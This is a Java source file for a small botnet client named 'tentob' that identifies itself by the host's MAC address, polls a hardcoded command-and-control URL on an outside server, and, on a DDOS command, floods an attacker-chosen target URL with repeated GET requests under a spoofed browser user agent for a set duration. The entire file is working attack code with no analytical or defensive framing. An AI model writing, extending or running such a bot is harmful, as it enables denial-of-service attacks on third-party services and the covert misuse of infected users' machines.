package org.tentob;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.Random;

public class Main {

	// properties
	private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36";
	private static final String CC_URL = "http://www.yolocaust.de/tentob/connect.php?id=";

	// commands
	// private static final String IDLE_COMMAND = "IDLE";
	private static final String DDOS_COMMAND = "DDOS";

	// values setted on startup
	private static String BOT_ID;
	private static boolean DEBUG = true;

	// dynamic values
	private static String COMMAND = "IDLE";
	private static String TARGET_URL = "http://www.yolocaust.de/tentob/";
	private static int DDOS_FREQUENCY = 3; // attempts per second
	private static int DDOS_DURATION; // in seconds
	private static String CURRENT_DDOS_TIMESTAMP;
	private static String OLD_DDOS_TIMESTAMP;
	private static String CC_URL_APPENDIX = "";

	private static void requestCC() throws Exception {

		// set up connection
		String ccUrl = CC_URL + BOT_ID + CC_URL_APPENDIX;
		URL ccUrlObj = new URL(ccUrl);
		HttpURLConnection hhHttpURLConnection = (HttpURLConnection) ccUrlObj.openConnection();
		hhHttpURLConnection.setRequestMethod("GET");
		hhHttpURLConnection.setRequestProperty("User-Agent", USER_AGENT);
		
		// get response
		BufferedReader in = new BufferedReader(new InputStreamReader(hhHttpURLConnection.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();
		while ((inputLine = in.readLine()) != null)
			response.append(inputLine);
		in.close();

		// show response
		if (DEBUG) {
			System.out.println("Requested CC: " + ccUrl);
			System.out.println("Response: " + response.toString());
		}

		// evaluate response
		if (response != null && !response.toString().isEmpty()) {
			String possibleCommand = response.toString().split(" ")[0];
			switch (possibleCommand) {
			case DDOS_COMMAND:
				// expecting 3 more args besides command
				String[] splittedResponse = response.toString().split(" ");
				if (splittedResponse.length == 5) {
					COMMAND = DDOS_COMMAND;
					TARGET_URL = splittedResponse[1];
					DDOS_FREQUENCY = Integer.parseInt(splittedResponse[2]);
					CURRENT_DDOS_TIMESTAMP = splittedResponse[3];
					DDOS_DURATION = Integer.parseInt(splittedResponse[4]);
				} else
					System.err.println(splittedResponse.length+" args given, 5 args expecting => doing nothing");
				break;

			default:
				// nothing
				break;
			}
		}

	}

	private static void performDDoS() throws Exception {

		if(OLD_DDOS_TIMESTAMP==null||!OLD_DDOS_TIMESTAMP.equals(CURRENT_DDOS_TIMESTAMP)) {
			
			// not yet a DDoS attack performed
			// or a new order
			OLD_DDOS_TIMESTAMP = CURRENT_DDOS_TIMESTAMP;
			
			if (TARGET_URL != null && !TARGET_URL.isEmpty()) {
				int counter = DDOS_DURATION;
				while(counter>0) {
					long start = System.currentTimeMillis();
					for (int i = 0; i < DDOS_FREQUENCY; i++) {
						URL ccUrlObj = new URL(TARGET_URL);
						
						HttpURLConnection httpURLConnection = (HttpURLConnection) ccUrlObj.openConnection();
						httpURLConnection.setRequestMethod("GET");
						httpURLConnection.setRequestProperty("User-Agent", USER_AGENT);
						httpURLConnection.setUseCaches(false);
						
						BufferedReader in = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
						String inputLine;
						StringBuffer response = new StringBuffer();
						while ((inputLine = in.readLine()) != null)
							response.append(inputLine);
						in.close();
					}
					long dur = System.currentTimeMillis()-start;
					if(dur<1000) {
						// took fewer than 1s
						// sleep the leftover
						Thread.sleep(1000-dur);
					}
					counter--;
				}
				System.out.println("attack performed");
			} else
				System.err.println("no Target-URL specified => no attack performed");
		} else {
			// old timestamp - attack already performed
			CC_URL_APPENDIX = "&dstate=done";
		}

		return;
	}

	public static void main(String[] args) throws Exception {

		InetAddress inetAddress = InetAddress.getLocalHost();
		NetworkInterface networkInterface = NetworkInterface.getByInetAddress(inetAddress);
		byte[] mac = networkInterface.getHardwareAddress();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < mac.length; i++) {
			stringBuilder.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
		}
		BOT_ID = stringBuilder.toString();

		if (DEBUG)
			System.out.println("Bot-ID (MAC address): " + BOT_ID);

		Random random = new Random();
		
		// "listen" for command
		while (true) {
			Main.requestCC();

			switch (COMMAND) {

			case "DDOS":
				performDDoS();
				break;

			default:
				// just idle around
				break;
			}
			int randomInt = random.nextInt(45);
			System.out.println("Sleeping "+randomInt+" seconds");
			Thread.sleep(randomInt*1000);
		}

	}

}
